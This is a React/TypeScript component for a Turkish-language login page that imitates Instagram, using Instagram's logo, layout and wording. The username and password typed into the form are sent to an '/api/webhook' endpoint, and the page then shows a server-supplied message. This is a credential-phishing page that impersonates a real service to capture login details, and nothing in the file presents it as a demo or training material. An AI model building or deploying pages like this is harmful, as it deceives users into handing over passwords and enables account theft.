import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Loader2, Facebook } from "lucide-react";
import { LoginFormData, loginFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";

export default function Login() {
  const [status, setStatus] = useState<{
    visible: boolean;
    type: "success" | "error";
    message: string;
  }>({
    visible: false,
    type: "success",
    message: "",
  });

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginFormSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const { mutate, isPending } = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await apiRequest("POST", "/api/webhook", data);
      return res.json();
    },
    onSuccess: (data) => {
      setStatus({
        visible: true,
        type: "success",
        message: data.message,
      });
      form.reset();
    },
    onError: (error: any) => {
      let message = "Bir hata oluştu. Lütfen tekrar deneyin.";
      
      if (error.message && typeof error.message === "string") {
        message = error.message;
      }
      
      setStatus({
        visible: true,
        type: "error",
        message,
      });
    },
  });

  function onSubmit(data: LoginFormData) {
    setStatus({ ...status, visible: false });
    mutate(data);
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 sm:px-6 lg:px-8 bg-gray-50">
      <div className="w-full max-w-md">
        <div className="mb-10 flex justify-end">
          <div className="relative">
            <select
              className="appearance-none text-sm font-medium text-gray-700 bg-transparent pr-8 focus:outline-none"
              defaultValue="tr"
            >
              <option value="tr">Türkçe</option>
            </select>
            <span className="absolute inset-y-0 right-0 flex items-center pointer-events-none">
              <svg className="h-4 w-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </span>
          </div>
        </div>
        
        <div className="bg-white p-8 border border-gray-300 shadow-sm rounded-lg">
          <div className="flex justify-center mb-8">
            <img src="/images/instagram_logo.png" alt="Instagram" className="h-16" />
          </div>
          
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="username"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                        {...field}
                        className="w-full px-2 py-3 text-sm border border-gray-300 rounded"
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-red-500" />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Şifre"
                        {...field}
                        className="w-full px-2 py-3 text-sm border border-gray-300 rounded"
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-red-500" />
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                disabled={isPending}
                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
              >
                {isPending ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Giriş yapılıyor...
                  </>
                ) : (
                  "Giriş yap"
                )}
              </Button>
              
              <div className="flex items-center my-4">
                <Separator className="flex-grow" />
                <span className="mx-4 text-sm text-gray-500 font-semibold">YA DA</span>
                <Separator className="flex-grow" />
              </div>
              
              <Button
                type="button"
                variant="outline"
                className="w-full flex items-center justify-center py-2 text-sm font-semibold text-blue-900"
              >
                <Facebook className="h-5 w-5 mr-2 text-blue-900" />
                Facebook ile Devam Et
              </Button>
              
              <div className="text-center mt-4">
                <a href="#" className="text-xs text-blue-900">
                  Şifreni mi unuttun?
                </a>
              </div>
            </form>
          </Form>
          
          {status.visible && (
            <Alert
              className={`mt-4 p-3 rounded text-xs ${
                status.type === "success"
                  ? "bg-green-100 text-green-800"
                  : "bg-red-100 text-red-800"
              }`}
            >
              <AlertDescription>{status.message}</AlertDescription>
            </Alert>
          )}
        </div>
        
        <div className="mt-4 bg-white p-5 border border-gray-300 text-center rounded-lg">
          <p className="text-sm">
            Hesabın yok mu? <a href="#" className="text-blue-500 font-semibold">Kaydol</a>
          </p>
        </div>
        
        <div className="mt-10 text-center text-xs text-gray-500">
          <p className="mb-4">
            Ayrıca ülkende giriş yapmadan yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin.
          </p>
        </div>
      </div>
    </div>
  );
}
